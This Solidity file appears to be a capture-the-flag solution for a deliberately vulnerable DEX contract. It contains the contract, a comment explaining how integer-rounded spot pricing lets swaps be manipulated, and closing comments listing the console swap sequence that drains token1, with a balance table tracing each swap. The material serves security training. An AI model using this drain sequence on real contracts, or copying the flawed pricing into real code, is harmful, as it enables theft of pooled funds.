// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract Dex {
    using SafeMath for uint256;
    address public token1;
    address public token2;

    constructor(address _token1, address _token2) public {
        token1 = _token1;
        token2 = _token2;
    }

    function swap(
        address from,
        address to,
        uint256 amount
    ) public {
        require(
            (from == token1 && to == token2) ||
                (from == token2 && to == token1),
            "Invalid tokens"
        );
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint256 swap_amount = get_swap_price(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swap_amount);
        IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
    }

    function add_liquidity(address token_address, uint256 amount) public {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function get_swap_price(
        address from,
        address to,
        uint256 amount
    ) public view returns (uint256) {
        return (
            /*
            The vulnerability originates from get_swap_price method which determines the exchange rate between tokens in the Dex. 
            The division in it won't always calculate to a perfect integer, but a fraction. 
            And there is no fraction types in Solidity. 
            Instead, division rounds towards zero. according to docs. For example, 3 / 2 = 1 in solidity.
            */
        (amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(spender, amount);
        SwappableToken(token2).approve(spender, amount);
    }

    function balanceOf(address token, address account)
        public
        view
        returns (uint256)
    {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }
}

/*
Steps to Complete the Challenge

1. await contract.approve(contract.address, 500) *** this step results in an infinite loop at Metamask to approve the transaction!!!
2. t1 = await contract.token1()
3. t2 = await contract.token2()
4. await contract.swap(t1, t2, 10)
5. await contract.swap(t2, t1, 20)
6. await contract.swap(t1, t2, 24)
7. await contract.swap(t2, t1, 30)
8. await contract.swap(t1, t2, 41)
9. await contract.swap(t2, t1, 45)
10. await contract.balanceOf(t1, instance).then(v => v.toString())

// Reference: https://coder-question.com/cq-blog/525296

      DEX       |        player  
token1 - token2 | token1 - token2
----------------------------------
  100     100   |   10      10  // starting
  110     90    |   0       20  // first swap  
  86      110   |   24      0   // second swap
  110     80    |   0       30  // third swap  
  69      110   |   41      0   // fourth swap 
  110     45    |   0       65  // fifth swap 
  0       90    |   110     20  // sixth swap

  ^ token1 is drained!

*/